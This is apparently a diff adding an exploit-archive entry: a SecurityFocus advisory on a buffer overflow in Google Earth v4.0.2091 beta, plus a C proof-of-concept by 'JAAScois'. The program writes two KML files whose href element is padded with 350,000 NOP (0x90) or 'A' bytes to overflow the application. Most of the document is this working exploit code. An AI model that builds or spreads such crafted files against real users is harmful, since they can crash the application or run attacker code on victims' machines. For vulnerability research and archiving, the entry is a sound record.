@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/20464/info
+
+Google Earth is prone to a buffer-overflow vulnerability because the application to properly verify the size of user-supplied data before copying it into an insufficiently sized process buffer.
+
+This issue allows remote attackers to execute arbitrary machine code in the context of the user running the affected application. Failed exploit attempts will likely crash applications, denying service to legitimate users.
+
+Google Earth version v4.0.2091(beta) is vulnerable to this issue.
+
+///////////////////////////////////////////////
+// Google Earth (kml & kmz files) buffer overflow
+// by JAAScois [ http://www.jaascois.com ]
+// Test on: Google Earth v4.0.2091(beta) Sep 14 2006
+///////////////////////////////////////////////
+#include <stdio.h>
+#include <string.h>
+char xmlHdr[]="<?xml version=\'1.0\' encoding=\'UTF-8\'?>\n<kml
+xmlns=\'http://earth.google.com/kml/2.1\'>\n<Placemark><name>By:
+JAAScois.com</name><Model><Link><href>";
+char xmlHdr2[]="</href></Link></Model></Placemark></kml>";
+int main(int argc, char* argv[])
+{
+FILE *Gkml;
+FILE *GkmlX;
+int i;
+unsigned char nop;
+printf("Google Earth (kml & kmz files) buffer overflow \n");
+printf(" by JAAScois [ http://www.jaascois.com ]\n");
+
+// Gkml.kml
+Gkml=fopen("Gkml.kml","w+b");
+if(Gkml==NULL){
+printf("-Error: fopen \n");
+return 0;
+}
+
+fwrite(xmlHdr,strlen(xmlHdr),1,Gkml);
+nop=0x90;
+for(i=0;i<350000;i++){
+fwrite(&nop,1,1,Gkml);
+}
+fwrite(xmlHdr2,strlen(xmlHdr2),1,Gkml);
+fclose (Gkml);
+
+// GkmlX.kml
+GkmlX=fopen("GkmlX.kml","w+b");
+if(GkmlX==NULL){
+printf("-Error: fopen \n");
+return 0;
+}
+
+fwrite(xmlHdr,strlen(xmlHdr),1,GkmlX);
+nop=0x41;
+for(i=0;i<350000;i++){
+fwrite(&nop,1,1,GkmlX);
+}
+fwrite(xmlHdr2,strlen(xmlHdr2),1,GkmlX);
+fclose (GkmlX);
+
+printf("- Created file: Gkml.kml ...OK\n");
+return 0;
+}
